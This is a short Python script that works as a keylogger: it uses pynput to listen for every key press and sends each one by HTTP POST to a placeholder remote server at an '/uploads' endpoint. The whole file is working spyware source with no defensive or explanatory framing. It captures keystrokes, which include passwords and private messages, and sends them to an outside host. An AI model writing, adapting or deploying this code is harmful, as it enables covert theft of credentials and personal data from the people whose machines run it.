import json
import requests
from pynput import keyboard

# Your Flask server endpoint
URL = "http://<>your servers ip address>:8080/uploads"

def callback(send):
        
    # Send data via HTTP POST requests
    response = requests.post(URL, data={'text': send})

    if response.status_code == 200:
        print("[✓] Sent successfully.")
    else:
        print(f"[✗] Failed. Status code: {response.status_code}")

# Create a keylogger and listen for events
keylogger = keyboard.Listener(on_press=callback)
keylogger.start()

try:
    while True:
        pass
except KeyboardInterrupt:
    # Clean up on exit
    keylogger.stop()
